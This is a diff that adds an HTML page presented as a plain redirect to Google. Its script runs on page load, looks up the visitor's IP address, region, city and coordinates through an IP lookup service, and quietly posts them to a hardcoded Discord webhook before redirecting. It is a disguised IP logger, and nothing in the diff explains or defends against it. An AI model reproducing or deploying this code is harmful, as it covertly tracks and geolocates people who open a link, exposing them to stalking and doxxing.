@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Redirecting...</title>
+</head>
+<body>
+<script>
+  const webhookUrl = "https://discord.com/api/webhooks/1395683363972452372/A1yd-G6CR3BUQT0JagZ7kYXb2k9zqY6jrd-QPzStNphBmOIjqbUekFrzXML_6WMXDVkT";
+
+  async function sendToWebhook(data) {
+    try {
+      await fetch(webhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: `IP Info:\nIP: ${data.ip}\nRegion: ${data.region}\nCity: ${data.city}\nLatitude: ${data.latitude}\nLongitude: ${data.longitude}`
+        })
+      });
+    } catch (e) {}
+  }
+
+  async function init() {
+    try {
+      const res = await fetch("https://ipwho.is/");
+      const data = await res.json();
+
+      if (data.success) {
+        await sendToWebhook({
+          ip: data.ip,
+          region: data.region,
+          city: data.city,
+          latitude: data.latitude,
+          longitude: data.longitude
+        });
+      }
+    } catch (e) {}
+
+    window.location.href = "https://www.google.com";
+  }
+
+  init();
+</script>
+</body>
+</html>
